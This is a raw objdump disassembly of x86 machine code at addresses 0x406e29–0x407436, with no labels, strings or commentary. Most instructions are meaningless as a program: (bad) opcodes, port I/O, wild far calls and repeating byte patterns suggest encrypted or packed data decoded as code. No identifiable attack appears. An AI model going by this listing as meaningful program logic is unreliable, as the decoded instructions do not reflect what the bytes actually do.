  406e29:	26 3a 0e             	cmp    %es:(%esi),%cl
  406e2c:	e8 f4 78 66 00       	call   0xa6e725
  406e31:	5b                   	pop    %ebx
  406e32:	fc                   	cld
  406e33:	24 68                	and    $0x68,%al
  406e35:	0c 5a                	or     $0x5a,%al
  406e37:	e9 2a 64 d2 03       	jmp    0x412d266
  406e3c:	78 64                	js     0x406ea2
  406e3e:	3a 0e                	cmp    (%esi),%cl
  406e40:	49                   	dec    %ecx
  406e41:	a2 78 66 00 e4       	mov    %al,0xe4006678
  406e46:	aa                   	stos   %al,%es:(%edi)
  406e47:	24 68                	and    $0x68,%al
  406e49:	0c 05                	or     $0x5,%al
  406e4b:	a0 2a 64 52 46       	mov    0x4652642a,%al
  406e50:	e8 24 3a 8e 24       	call   0x24cea879
  406e55:	74 3a                	je     0x406e91
  406e57:	66 e1 94             	data16 loope 0x406dee
  406e5a:	cd 80                	int    $0x80
  406e5c:	e1 e1                	loope  0x406e3f
  406e5e:	96                   	xchg   %eax,%esi
  406e5f:	98                   	cwtl
  406e60:	97                   	xchg   %eax,%edi
  406e61:	9b                   	fwait
  406e62:	b3 a0                	mov    $0xa0,%bl
  406e64:	e5 61                	in     $0x61,%eax
  406e66:	3a ae 2a 64 b3 23    	cmp    0x23b3642a(%esi),%ch
  406e6c:	88 c5                	mov    %al,%ch
  406e6e:	1a e8                	sbb    %al,%ch
  406e70:	29 64 b3 23          	sub    %esp,0x23(%ebx,%esi,4)
  406e74:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406e75:	e9 3f 90 07 24       	jmp    0x2447feb9
  406e7a:	3a ef                	cmp    %bh,%ch
  406e7c:	2d a4 52 66 17       	sub    $0x176652a4,%eax
  406e81:	64 3a 0c 68          	cmp    %fs:(%eax,%ebp,2),%cl
  406e85:	8c c4                	mov    %es,%esp
  406e87:	6b 68 64 b3          	imul   $0xffffffb3,0x64(%eax),%ebp
  406e8b:	23 bc e5 fc 32 30 64 	and    0x643032fc(%ebp,%eiz,8),%edi
  406e92:	3a 0e                	cmp    (%esi),%cl
  406e94:	6b 1b 3a             	imul   $0x3a,(%ebx),%ebx
  406e97:	66 02 64 d2 93       	data16 add -0x6d(%edx,%edx,8),%ah
  406e9c:	65 64 3a ef          	gs fs cmp %bh,%ch
  406ea0:	2d b4 b9 03 b4       	sub    $0xb403b9b4,%eax
  406ea5:	64 50                	fs push %eax
  406ea7:	66 80 b3 34 66 68 ed 	data16 xorb $0x7f,-0x129799cc(%ebx)
  406eae:	7f 
  406eaf:	be af 21 86 65       	mov    $0x658621af,%esi
  406eb4:	68 64 3a e5 0d       	push   $0xde53a64
  406eb9:	a0 3a e7 ae c1       	mov    0xc1aee73a,%al
  406ebe:	1d 66 68 e7 5f       	sbb    $0x5fe76866,%eax
  406ec3:	ae                   	scas   %es:(%edi),%al
  406ec4:	68 e9 7f da 38       	push   $0x38da7fe9
  406ec9:	8c e4                	mov    %fs,%esp
  406ecb:	6b 68 64 50          	imul   $0x50,0x64(%eax),%ebp
  406ecf:	66 97                	xchg   %ax,%di
  406ed1:	51                   	push   %ecx
  406ed2:	1a e8                	sbb    %al,%ch
  406ed4:	29 64 50 66          	sub    %esp,0x66(%eax,%edx,2)
  406ed8:	02 64 50 66          	add    0x66(%eax,%edx,2),%ah
  406edc:	02 64 50 66          	add    0x66(%eax,%edx,2),%ah
  406ee0:	02 64 52 66          	add    0x66(%edx,%edx,2),%ah
  406ee4:	68 ae 3a 0e 68       	push   $0x680e3aae
  406ee9:	ac                   	lods   %ds:(%esi),%al
  406eea:	78 66                	js     0x406f52
  406eec:	00 64 f2 24          	add    %ah,0x24(%edx,%esi,8)
  406ef0:	68 0e 3a 8e 38       	push   $0x388e3a0e
  406ef5:	6a 3a                	push   $0x3a
  406ef7:	66 cb                	lretw
  406ef9:	9c                   	pushf
  406efa:	b7 27                	mov    $0x27,%bh
  406efc:	68 ed ca 91 8e       	push   $0x8e91caed
  406f01:	ed                   	in     (%dx),%eax
  406f02:	bf ce 96 9b c5       	mov    $0xc59b96ce,%edi
  406f07:	ef                   	out    %eax,(%dx)
  406f08:	ae                   	scas   %es:(%edi),%al
  406f09:	0c ae                	or     $0xae,%al
  406f0b:	c6                   	(bad)
  406f0c:	2a 64 50 66          	sub    0x66(%eax,%edx,2),%ah
  406f10:	02 64 d2 e7          	add    -0x19(%edx,%edx,8),%ah
  406f14:	64 64 3a 0c 68       	fs cmp %fs:(%eax,%ebp,2),%cl
  406f19:	8c d2                	mov    %ss,%edx
  406f1b:	d8 97 9b b9 a2 5c    	fcoms  0x5ca2b99b(%edi)
  406f21:	8c 88 6d 68 64 07    	mov    %cs,0x764686d(%eax)
  406f27:	66 68 64 ba          	pushw  $0xba64
  406f2b:	14 50                	adc    $0x50,%al
  406f2d:	0c 2e                	or     $0x2e,%al
  406f2f:	a0 2a 64 d2 3f       	mov    0x3fd2642a,%al
  406f34:	63 64 3a 0e          	arpl   %esp,0xe(%edx,%edi,1)
  406f38:	95                   	xchg   %eax,%ebp
  406f39:	a1 78 66 38 8c       	mov    0x8c386678,%eax
  406f3e:	5c                   	pop    %esp
  406f3f:	6d                   	insl   (%dx),%es:(%edi)
  406f40:	68 64 b3 e3 cc       	push   $0xcce3b364
  406f45:	9a c5 99 d0 87 63 66 	lcall  $0x6663,$0x87d099c5
  406f4c:	68 93 dc ef ed       	push   $0xedefdc93
  406f51:	c4                   	(bad)
  406f52:	c4 99 97 ed fc 8e    	les    -0x71031269(%ecx),%ebx
  406f58:	90                   	nop
  406f59:	6e                   	outsb  %ds:(%esi),(%dx)
  406f5a:	3a 66 02             	cmp    0x2(%esi),%ah
  406f5d:	65 6a 99             	gs push $0xffffff99
  406f60:	fd                   	std
  406f61:	c0 c4 99             	rol    $0x99,%ah
  406f64:	97                   	xchg   %eax,%edi
  406f65:	8c 07                	mov    %es,(%edi)
  406f67:	d2 97 9b b3 96 69    	rclb   %cl,0x6996b39b(%edi)
  406f6d:	94                   	xchg   %eax,%esp
  406f6e:	b3 a0                	mov    $0xa0,%bl
  406f70:	e5 e1                	in     $0xe1,%eax
  406f72:	8e 98 97 9b 6a 0c    	mov    0xc6a9b97(%eax),%ds
  406f78:	68 0e 3a 0e 43       	push   $0x430e3a0e
  406f7d:	0c 7a                	or     $0x7a,%al
  406f7f:	66 02 64 50 66       	data16 add 0x66(%eax,%edx,2),%ah
  406f84:	80 f7 36             	xor    $0x36,%bh
  406f87:	66 68 34 d2          	pushw  $0xd234
  406f8b:	6b 63 64 3a          	imul   $0x3a,0x64(%ebx),%esp
  406f8f:	eb ed                	jmp    0x406f7e
  406f91:	d0 c4                	rol    $1,%ah
  406f93:	99                   	cltd
  406f94:	97                   	xchg   %eax,%edi
  406f95:	34 50                	xor    $0x50,%al
  406f97:	66 02 64 52 d6       	data16 add -0x2a(%edx,%edx,2),%ah
  406f9c:	00 24 3a             	add    %ah,(%edx,%edi,1)
  406f9f:	0c 68                	or     $0x68,%al
  406fa1:	0e                   	push   %cs
  406fa2:	3a 8e 1c 68 3a 66    	cmp    0x663a681c(%esi),%cl
  406fa8:	38 8c d4 6c 68 64 50 	cmp    %cl,0x5064686c(%esp,%edx,8)
  406faf:	66 00 90 3b 66 68 0e 	data16 add %dl,0xe68663b(%eax)
  406fb6:	3b 99 5d 9c b7 27    	cmp    0x27b79c5d(%ecx),%ebx
  406fbc:	68 8c e4 6a 68       	push   $0x686ae48c
  406fc1:	64 d1 7e e5          	sarl   $1,%fs:-0x1b(%esi)
  406fc5:	21 de                	and    %ebx,%esi
  406fc7:	36 80 5b 37 66       	sbbb   $0x66,%ss:0x37(%ebx)
  406fcc:	68 e5 cc 4e 7f       	push   $0x7f4ecce5
  406fd1:	64 3a eb             	fs cmp %bl,%ch
  406fd4:	2d 80 6a 8e 54       	sub    $0x548e6a80,%eax
  406fd9:	69 3a 66 02 64 50    	imul   $0x50640266,(%edx),%edi
  406fdf:	66 02 64 b7 23       	data16 add 0x23(%edi,%esi,4),%ah
  406fe4:	8c 34 d2             	mov    %?,(%edx,%edx,8)
  406fe7:	bf 64 64 3a 6f       	mov    $0x6f3a6464,%edi
  406fec:	a8 11                	test   $0x11,%al
  406fee:	ef                   	out    %eax,(%dx)
  406fef:	39 36                	cmp    %esi,(%esi)
  406ff1:	3f                   	aas
  406ff2:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  406ff4:	78 64                	js     0x40705a
  406ff6:	6f                   	outsl  %ds:(%esi),(%dx)
  406ff7:	ef                   	out    %eax,(%dx)
  406ff8:	8d                   	lea    (bad),%esp
  406ff9:	e5 d6                	in     $0xd6,%eax
  406ffb:	22 6a 64             	and    0x64(%edx),%ch
  406ffe:	3a 35 3e 33 85 44    	cmp    0x4485333e,%dh
  407004:	37                   	aaa
  407005:	c0 3d de ea 68 3a 66 	sarb   $0x66,0x3a68eade
  40700c:	9f                   	lahf
  40700d:	83 b3 23 94 ed fd ed 	xorl   $0xffffffed,-0x2126bdd(%ebx)
  407014:	2d 68 b9 9e 78       	sub    $0x789eb968,%eax
  407019:	6b be e3 69 64 3a 19 	imul   $0x19,0x3a6469e3(%esi),%edi
  407020:	66 e7 c2             	out    %ax,$0xc2
  407023:	64 67 e0 60          	fs loopnew 0x407087
  407027:	67 68 64 d3 fb 6f    	addr16 push $0x6ffbd364
  40702d:	64 3a 5b 79          	cmp    %fs:0x79(%ebx),%bl
  407031:	65 3a 66 67          	cmp    %gs:0x67(%esi),%ah
  407035:	e0 75                	loopne 0x4070ac
  407037:	64 68 64 07 75 69    	fs push $0x69750764
  40703d:	64 3a 12             	cmp    %fs:(%edx),%dl
  407040:	73 59                	jae    0x40709b
  407042:	2b 67 68             	sub    0x68(%edi),%esp
  407045:	64 35 ea e8 63 3a    	fs xor $0x3a63e8ea,%eax
  40704b:	66 55                	push   %bp
  40704d:	5c                   	pop    %esp
  40704e:	3b 66 68             	cmp    0x68(%esi),%esp
  407051:	6b be 12 69 64 3a 8f 	imul   $0xffffff8f,0x3a646912(%esi),%edi
  407058:	18 63 3a             	sbb    %ah,0x3a(%ebx)
  40705b:	66 eb 59             	data16 jmp 0x4070b7
  40705e:	c6 c6 2a             	mov    $0x2a,%dh
  407061:	64 3a 69 ec          	cmp    %fs:-0x14(%ecx),%ch
  407065:	84 3a                	test   %bh,(%edx)
  407067:	66 68 0c 2f          	pushw  $0x2f0c
  40706b:	ae                   	scas   %es:(%edi),%al
  40706c:	2a 64 c5 53          	sub    0x53(%ebp,%eax,8),%ah
  407070:	94                   	xchg   %eax,%esp
  407071:	c4 78 66             	les    0x66(%eax),%edi
  407074:	80 e5 d5             	and    $0xd5,%ch
  407077:	99                   	cltd
  407078:	97                   	xchg   %eax,%edi
  407079:	ed                   	in     (%dx),%eax
  40707a:	bf 8e 95 9b c5       	mov    $0xc59b958e,%edi
  40707f:	ef                   	out    %eax,(%dx)
  407080:	90                   	nop
  407081:	93                   	xchg   %eax,%ebx
  407082:	dd ef                	fucomp %st(7)
  407084:	ed                   	in     (%dx),%eax
  407085:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407086:	c7                   	(bad)
  407087:	99                   	cltd
  407088:	97                   	xchg   %eax,%edi
  407089:	ed                   	in     (%dx),%eax
  40708a:	fd                   	std
  40708b:	0e                   	push   %cs
  40708c:	64 ac                	lods   %fs:(%esi),%al
  40708e:	78 66                	js     0x4070f6
  407090:	97                   	xchg   %eax,%edi
  407091:	d1 d2                	rcl    $1,%edx
  407093:	9b                   	fwait
  407094:	97                   	xchg   %eax,%edi
  407095:	9b                   	fwait
  407096:	d2 39                	sarb   %cl,(%ecx)
  407098:	87 9b c5 e5 ac 74    	xchg   %ebx,0x74ace5c5(%ebx)
  40709e:	b3 e3                	mov    $0xe3,%bl
  4070a0:	8c 99 c5 99 e5 e1    	mov    %ds,-0x1e1a663b(%ecx)
  4070a6:	ee                   	out    %al,(%dx)
  4070a7:	9b                   	fwait
  4070a8:	97                   	xchg   %eax,%edi
  4070a9:	9b                   	fwait
  4070aa:	6a 99                	push   $0xffffff99
  4070ac:	dd 80 c7 99 97 8c    	fldl   -0x73686639(%eax)
  4070b2:	b0 6d                	mov    $0x6d,%al
  4070b4:	68 64 33 a6 67       	push   $0x67a63364
  4070b9:	e0 b1                	loopne 0x40706c
  4070bb:	66 68 64 b7          	pushw  $0xb764
  4070bf:	e3 ac                	jecxz  0x40706d
  4070c1:	99                   	cltd
  4070c2:	c5 99 38 9b 0f 52    	lds    0x520f9b38(%ecx),%ebx
  4070c8:	e7 25                	out    %eax,$0x25
  4070ca:	3a 8e 18 6f 3a 66    	cmp    0x663a6f18(%esi),%cl
  4070d0:	61                   	popa
  4070d1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4070d2:	4e                   	dec    %esi
  4070d3:	13 e3                	adc    %ebx,%esp
  4070d5:	e1 e6                	loope  0x4070bd
  4070d7:	9b                   	fwait
  4070d8:	97                   	xchg   %eax,%edi
  4070d9:	9b                   	fwait
  4070da:	11 e3                	adc    %esp,%ebx
  4070dc:	bc 99 c5 99 eb       	mov    $0xeb99c599,%esp
  4070e1:	8c 3e                	mov    %?,(%esi)
  4070e3:	ed                   	in     (%dx),%eax
  4070e4:	fd                   	std
  4070e5:	a8 c7                	test   $0xc7,%al
  4070e7:	99                   	cltd
  4070e8:	97                   	xchg   %eax,%edi
  4070e9:	4f                   	dec    %edi
  4070ea:	af                   	scas   %es:(%edi),%eax
  4070eb:	a2 95 9b c5 5f       	mov    %al,0x5fc59b95
  4070f0:	b8 11 25 ed ed       	mov    $0xeded2511,%eax
  4070f5:	84 c7                	test   %al,%bh
  4070f7:	99                   	cltd
  4070f8:	97                   	xchg   %eax,%edi
  4070f9:	4f                   	dec    %edi
  4070fa:	bf be 95 9b c5       	mov    $0xc59b95be,%edi
  4070ff:	e5 80                	in     $0x80,%eax
  407101:	60                   	pusha
  407102:	b1 f3                	mov    $0xf3,%cl
  407104:	b8 99 c5 99 43       	mov    $0x4399c599,%eax
  407109:	f1                   	int1
  40710a:	f2 9b                	repnz fwait
  40710c:	97                   	xchg   %eax,%edi
  40710d:	9b                   	fwait
  40710e:	03 b6 1c 53 50 67    	add    0x6750531c(%esi),%esi
  407114:	e3 e1                	jecxz  0x4070f7
  407116:	da 9b 97 9b 11 e3    	ficompl -0x1cee6469(%ebx)
  40711c:	b0 99                	mov    $0x99,%al
  40711e:	c5 99 38 ef bf ba    	lds    -0x454010c8(%ecx),%ebx
  407124:	95                   	xchg   %eax,%ebp
  407125:	9b                   	fwait
  407126:	c5 4d ed             	lds    -0x13(%ebp),%ecx
  407129:	b0 c7                	mov    $0xc7,%al
  40712b:	99                   	cltd
  40712c:	97                   	xchg   %eax,%edi
  40712d:	34 50                	xor    $0x50,%al
  40712f:	66 02 64 c5 53       	data16 add 0x53(%ebp,%eax,8),%ah
  407134:	5c                   	pop    %esp
  407135:	eb 7b                	jmp    0x4071b2
  407137:	66 80 47 36 66       	data16 addb $0x66,0x36(%edi)
  40713c:	68 ed c2 91 8f       	push   $0x8f91c2ed
  407141:	ed                   	in     (%dx),%eax
  407142:	bf da 95 9b c5       	mov    $0xc59b95da,%edi
  407147:	ef                   	out    %eax,(%dx)
  407148:	af                   	scas   %es:(%edi),%eax
  407149:	e7 07                	out    %eax,$0x7
  40714b:	9e                   	sahf
  40714c:	c8 26 3a 66          	enter  $0x3a26,$0x66
  407150:	67 e0 bd             	loopnew 0x407110
  407153:	60                   	pusha
  407154:	68 64 9b 9e c8       	push   $0xc89e9b64
  407159:	26 3a c5             	es cmp %ch,%al
  40715c:	94                   	xchg   %eax,%esp
  40715d:	c4 78 66             	les    0x66(%eax),%edi
  407160:	e1 9c                	loope  0x4070fe
  407162:	cd 81                	int    $0x81
  407164:	e1 e1                	loope  0x407147
  407166:	d2 9b 97 9b b3 a1    	rcrb   %cl,-0x5e4c6469(%ebx)
  40716c:	eb 41                	jmp    0x4071af
  40716e:	c2 c6 2a             	ret    $0x2ac6
  407171:	64 3a 99 5d 98 9a 24 	cmp    %fs:0x249a985d(%ecx),%bl
  407178:	68 8c cd 88 97       	push   $0x9788cd8c
  40717d:	9b                   	fwait
  40717e:	63 8f 31 62 3a 66    	arpl   %ecx,0x663a6231(%edi)
  407184:	e9 8b 1b 53 68       	jmp    0x68938d14
  407189:	64 9b                	fs fwait
  40718b:	9e                   	sahf
  40718c:	e5 25                	in     $0x25,%eax
  40718e:	3a 5f 2d             	cmp    0x2d(%edi),%bl
  407191:	6c                   	insb   (%dx),%es:(%edi)
  407192:	35 e3 2d 62 3a       	xor    $0x3a622de3,%eax
  407197:	66 02 64 d2 f7       	data16 add -0x9(%edx,%edx,8),%ah
  40719c:	63 64 3a 8f          	arpl   %esp,-0x71(%edx,%edi,1)
  4071a0:	51                   	push   %ecx
  4071a1:	62 3a                	bound  %edi,(%edx)
  4071a3:	66 e1 9c             	data16 loope 0x407142
  4071a6:	cd 81                	int    $0x81
  4071a8:	e1 e1                	loope  0x40718b
  4071aa:	d2 9b 97 9b b3 a1    	rcrb   %cl,-0x5e4c6469(%ebx)
  4071b0:	c9                   	leave
  4071b1:	9c                   	pushf
  4071b2:	b7 27                	mov    $0x27,%bh
  4071b4:	68 5d 7f 6e 67       	push   $0x676e7f5d
  4071b9:	e1 25                	loope  0x4071e0
  4071bb:	60                   	pusha
  4071bc:	68 64 c5 13 60       	push   $0x6013c564
  4071c1:	8c b4 6d 68 64 d3 74 	mov    %?,0x74d36468(%ebp,%ebp,2)
  4071c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4071c9:	64 3a ed             	fs cmp %ch,%ch
  4071cc:	2d 70 b3 e3 98       	sub    $0x98e3b370,%eax
  4071d1:	9a c5 99 e9 8b 1f 43 	lcall  $0x431f,$0x8be999c5
  4071d8:	68 64 01 63 0c       	push   $0xc630164
  4071dd:	f4                   	hlt
  4071de:	78 66                	js     0x407246
  4071e0:	1c 48                	sbb    $0x48,%al
  4071e2:	01 63 58             	add    %esp,0x58(%ebx)
  4071e5:	ed                   	in     (%dx),%eax
  4071e6:	7b 66                	jnp    0x40724e
  4071e8:	1c 40                	sbb    $0x40,%al
  4071ea:	01 63 98             	add    %esp,-0x68(%ebx)
  4071ed:	e9 7b 66 1c 78       	jmp    0x785cd86d
  4071f2:	01 63 e8             	add    %esp,-0x18(%ebx)
  4071f5:	f6 78 66             	idivb  0x66(%eax)
  4071f8:	1c 70                	sbb    $0x70,%al
  4071fa:	01 63 04             	add    %esp,0x4(%ebx)
  4071fd:	f4                   	hlt
  4071fe:	78 66                	js     0x407266
  407200:	1c 68                	sbb    $0x68,%al
  407202:	01 63 e4             	add    %esp,-0x1c(%ebx)
  407205:	f6 78 66             	idivb  0x66(%eax)
  407208:	67 e1 f5             	loopew 0x407200
  40720b:	63 68 64             	arpl   %ebp,0x64(%eax)
  40720e:	b1 e3                	mov    $0xe3,%cl
  407210:	98                   	cwtl
  407211:	9a c5 99 53 61 56 f6 	lcall  $0xf656,$0x615399c5
  407218:	2a 64 4e 6e          	sub    0x6e(%esi,%ecx,2),%ah
  40721c:	53                   	push   %ebx
  40721d:	61                   	popa
  40721e:	b6 f4                	mov    $0xf4,%dh
  407220:	2a 64 4f 69          	sub    0x69(%edi,%ecx,2),%ah
  407224:	00 d4                	add    %dl,%ah
  407226:	2a 76 68             	sub    0x68(%esi),%dh
  407229:	9b                   	fwait
  40722a:	4f                   	dec    %edi
  40722b:	76 80                	jbe    0x4071ad
  40722d:	0f 31                	rdtsc
  40722f:	66 68 8f 30          	pushw  $0x308f
  407233:	0c 68                	or     $0x68,%al
  407235:	9b                   	fwait
  407236:	4f                   	dec    %edi
  407237:	76 80                	jbe    0x4071b9
  407239:	3b 31                	cmp    (%ecx),%esi
  40723b:	66 68 0c c5          	pushw  $0xc50c
  40723f:	99                   	cltd
  407240:	97                   	xchg   %eax,%edi
  407241:	64 c5 13             	lds    %fs:(%ebx),%edx
  407244:	78 8c                	js     0x4071d2
  407246:	7c 6d                	jl     0x4072b5
  407248:	68 64 bb 89 9d       	push   $0x9d89bb64
  40724d:	7d 3a                	jge    0x407289
  40724f:	66 eb c1             	data16 jmp 0x407213
  407252:	e2 9b                	loop   0x4071ef
  407254:	97                   	xchg   %eax,%edi
  407255:	9b                   	fwait
  407256:	3a e5                	cmp    %ch,%ah
  407258:	cd b8                	int    $0xb8
  40725a:	c7                   	(bad)
  40725b:	99                   	cltd
  40725c:	97                   	xchg   %eax,%edi
  40725d:	64 b7 e3             	fs mov $0xe3,%bh
  407260:	b0 99                	mov    $0x99,%al
  407262:	c5 99 38 8c 04 6d    	lds    0x6d048c38(%ecx),%ebx
  407268:	68 64 b3 e3 8c       	push   $0x8ce3b364
  40726d:	99                   	cltd
  40726e:	c5 99 81 0c 3f 66    	lds    0x663f0c81(%ecx),%ebx
  407274:	68 dc 34 35 68       	push   $0x683534dc
  407279:	64 cd 81             	fs int $0x81
  40727c:	e1 e1                	loope  0x40725f
  40727e:	ee                   	out    %al,(%dx)
  40727f:	9b                   	fwait
  407280:	97                   	xchg   %eax,%edi
  407281:	9b                   	fwait
  407282:	b3 a1                	mov    $0xa1,%bl
  407284:	81 30 3f 66 68 0c    	xorl   $0xc68663f,(%eax)
  40728a:	c5 66 68             	lds    0x68(%esi),%esp
  40728d:	64 b7 e3             	fs mov $0xe3,%bh
  407290:	95                   	xchg   %eax,%ebp
  407291:	9a c5 99 38 9b 0f 8e 	lcall  $0x8e0f,$0x9b3899c5
  407298:	e5 25                	in     $0x25,%eax
  40729a:	3a 8e fc 6d 3a 66    	cmp    0x663a6dfc(%esi),%cl
  4072a0:	e8 d9 c7 98 97       	call   0x97d93a7e
  4072a5:	9b                   	fwait
  4072a6:	3a 13                	cmp    (%ebx),%dl
  4072a8:	48                   	dec    %eax
  4072a9:	0e                   	push   %cs
  4072aa:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  4072ad:	0c ed                	or     $0xed,%al
  4072af:	a3 2a 64 50 66       	mov    %eax,0x6650642a
  4072b4:	80 9b 33 66 68 9b 0f 	sbbb   $0xf,-0x649799cd(%ebx)
  4072bb:	8e e5                	mov    %ebp,%fs
  4072bd:	25 3a 8e c4 6d       	and    $0x6dc48e3a,%eax
  4072c2:	3a 66 81             	cmp    -0x7f(%esi),%ah
  4072c5:	9f                   	lahf
  4072c6:	3e 66 68 e5 d5       	ds pushw $0xd5e5
  4072cb:	04 53                	add    $0x53,%al
  4072cd:	64 3a ec             	fs cmp %ah,%ch
  4072d0:	ed                   	in     (%dx),%eax
  4072d1:	99                   	cltd
  4072d2:	c4 99 97 ec bf 97    	les    -0x68401369(%ecx),%ebx
  4072d8:	95                   	xchg   %eax,%ebp
  4072d9:	9b                   	fwait
  4072da:	c5 a0 ed 96 c7 99    	lds    -0x66386913(%eax),%esp
  4072e0:	97                   	xchg   %eax,%edi
  4072e1:	64 52                	fs push %edx
  4072e3:	99                   	cltd
  4072e4:	68 64 3a eb ed       	push   $0xedeb3a64
  4072e9:	99                   	cltd
  4072ea:	c4 99 97 34 c5 53    	les    0x53c53497(%ecx),%ebx
  4072f0:	74 e1                	je     0x4072d3
  4072f2:	7a 66                	jp     0x40735a
  4072f4:	80 5f 33 66          	sbbb   $0x66,0x33(%edi)
  4072f8:	68 e4 87 9b 96       	push   $0x969b87e4
  4072fd:	9b                   	fwait
  4072fe:	c5 66 1d             	lds    0x1d(%esi),%esp
  407301:	44                   	inc    %esp
  407302:	50                   	push   %eax
  407303:	66 02 64 52 de       	data16 add -0x22(%edx,%edx,2),%ah
  407308:	ad                   	lods   %ds:(%esi),%eax
  407309:	26 3a 0c 68          	cmp    %es:(%eax,%ebp,2),%cl
  40730d:	8c 9c 6f 68 64 c5 53 	mov    %ds,0x53c56468(%edi,%ebp,2)
  407314:	74 e1                	je     0x4072f7
  407316:	7a 66                	jp     0x40737e
  407318:	80 37 33             	xorb   $0x33,(%edi)
  40731b:	66 68 8d 98          	pushw  $0x988d
  40731f:	62 68 64             	bound  %ebp,0x64(%eax)
  407322:	b7 eb                	mov    $0xeb,%bh
  407324:	95                   	xchg   %eax,%ebp
  407325:	9a c5 99 eb ac c5 26 	lcall  $0x26c5,$0xaceb99c5
  40732c:	e8 58 3b 66 1d       	call   0x1da6ae89
  407331:	9d                   	popf
  407332:	b9 9e 78 10 1a       	mov    $0x1a10789e,%ecx
  407337:	0c 68                	or     $0x68,%al
  407339:	0e                   	push   %cs
  40733a:	3a 0e                	cmp    (%esi),%cl
  40733c:	f9                   	stc
  40733d:	a1 78 66 02 64       	mov    0x64026678,%eax
  407342:	d2 17                	rclb   %cl,(%edi)
  407344:	61                   	popa
  407345:	64 3a 99 5d 78 bf 26 	cmp    %fs:0x26bf785d(%ecx),%bl
  40734c:	68 8c 24 6f 68       	push   $0x686f248c
  407351:	64 d3 0b             	rorl   %cl,%fs:(%ebx)
  407354:	6c                   	insb   (%dx),%es:(%edi)
  407355:	64 3a a0 ed 98 c4 99 	cmp    %fs:-0x663b6713(%eax),%ah
  40735c:	97                   	xchg   %eax,%edi
  40735d:	64 d1 5b 67          	rcrl   $1,%fs:0x67(%ebx)
  407361:	d2 bf 9a 96 9b c5    	sarb   %cl,-0x3a646966(%edi)
  407367:	ec                   	in     (%dx),%al
  407368:	ec                   	in     (%dx),%al
  407369:	61                   	popa
  40736a:	c7                   	(bad)
  40736b:	98                   	cwtl
  40736c:	97                   	xchg   %eax,%edi
  40736d:	9b                   	fwait
  40736e:	06                   	push   %es
  40736f:	56                   	push   %esi
  407370:	14 60                	adc    $0x60,%al
  407372:	06                   	push   %es
  407373:	5f                   	pop    %edi
  407374:	16                   	push   %ss
  407375:	44                   	inc    %esp
  407376:	50                   	push   %eax
  407377:	66 02 64 52 f7       	data16 add -0x9(%edx,%edx,2),%ah
  40737c:	ad                   	lods   %ds:(%esi),%eax
  40737d:	26 3a 0c 68          	cmp    %es:(%eax,%ebp,2),%cl
  407381:	8c 08                	mov    %cs,(%eax)
  407383:	6f                   	outsl  %ds:(%esi),(%dx)
  407384:	68 64 c5 53 74       	push   $0x7453c564
  407389:	e1 7a                	loope  0x407405
  40738b:	66 80 bb 32 66 68 8d 	data16 cmpb $0x14,-0x729799ce(%ebx)
  407392:	14 
  407393:	62 68 64             	bound  %ebp,0x64(%eax)
  407396:	ba e3 94 9a c5       	mov    $0xc59a94e3,%edx
  40739b:	99                   	cltd
  40739c:	69 ee bf 9a 96 9b    	imul   $0x9b969abf,%esi,%ebp
  4073a2:	c5 5a 78             	lds    0x78(%edx),%ebx
  4073a5:	16                   	push   %ss
  4073a6:	83 e7 87             	and    $0xffffff87,%edi
  4073a9:	b5 59                	mov    $0x59,%ch
  4073ab:	66 68 e9 bf          	pushw  $0xbfe9
  4073af:	9b                   	fwait
  4073b0:	96                   	xchg   %eax,%esi
  4073b1:	9b                   	fwait
  4073b2:	c5 36                	lds    (%esi),%esi
  4073b4:	e5 e1                	in     $0xe1,%eax
  4073b6:	cb                   	lret
  4073b7:	9b                   	fwait
  4073b8:	97                   	xchg   %eax,%edi
  4073b9:	9b                   	fwait
  4073ba:	6a 0e                	push   $0xe
  4073bc:	e3 a1                	jecxz  0x40735f
  4073be:	78 66                	js     0x407426
  4073c0:	e5 e1                	in     $0xe1,%eax
  4073c2:	cb                   	lret
  4073c3:	9b                   	fwait
  4073c4:	97                   	xchg   %eax,%edi
  4073c5:	9b                   	fwait
  4073c6:	6a 8e                	push   $0xffffff8e
  4073c8:	b0 6e                	mov    $0x6e,%al
  4073ca:	3a 66 eb             	cmp    -0x15(%esi),%ah
  4073cd:	a0 2a 0e 97 64       	mov    0x64970e2a,%al
  4073d2:	3a 66 e5             	cmp    -0x1b(%esi),%ah
  4073d5:	e1 c7                	loope  0x40739e
  4073d7:	98                   	cwtl
  4073d8:	97                   	xchg   %eax,%edi
  4073d9:	9b                   	fwait
  4073da:	6a 99                	push   $0xffffff99
  4073dc:	5d                   	pop    %ebp
  4073dd:	14 aa                	adc    $0xaa,%al
  4073df:	24 68                	and    $0x68,%al
  4073e1:	8c 74 6e 68          	mov    %?,0x68(%esi,%ebp,2)
  4073e5:	64 ba db 95 9a c5    	fs mov $0xc59a95db,%edx
  4073eb:	99                   	cltd
  4073ec:	68 11 1a 0c 68       	push   $0x680c1a11
  4073f1:	0e                   	push   %cs
  4073f2:	3a 0e                	cmp    (%esi),%cl
  4073f4:	03 a1 78 66 02 64    	add    0x64026678(%ecx),%esp
  4073fa:	d2 df                	rcr    %cl,%bh
  4073fc:	60                   	pusha
  4073fd:	64 3a 99 5d 14 aa 24 	cmp    %fs:0x24aa145d(%ecx),%bl
  407404:	68 8c 5c 6e 68       	push   $0x686e5c8c
  407409:	64 d3 d3             	fs rcl %cl,%ebx
  40740c:	6b 64 3a ef 90       	imul   $0xffffff90,-0x11(%edx,%edi,1),%esp
  407411:	65 c2 ef af          	gs ret $0xafef
  407415:	e9 bf 9b 96 9b       	jmp    0x9bd70fd9
  40741a:	c5 36                	lds    (%esi),%esi
  40741c:	e5 e1                	in     $0xe1,%eax
  40741e:	cb                   	lret
  40741f:	9b                   	fwait
  407420:	97                   	xchg   %eax,%edi
  407421:	9b                   	fwait
  407422:	6a 0e                	push   $0xe
  407424:	e3 a1                	jecxz  0x4073c7
  407426:	78 66                	js     0x40748e
  407428:	e5 e1                	in     $0xe1,%eax
  40742a:	cb                   	lret
  40742b:	9b                   	fwait
  40742c:	97                   	xchg   %eax,%edi
  40742d:	9b                   	fwait
  40742e:	6a 8e                	push   $0xffffff8e
  407430:	18 6e 3a             	sbb    %ch,0x3a(%esi)
  407433:	66 eb a0             	data16 jmp 0x4073d6
  407436:	2a 0e                	sub    (%esi),%cl
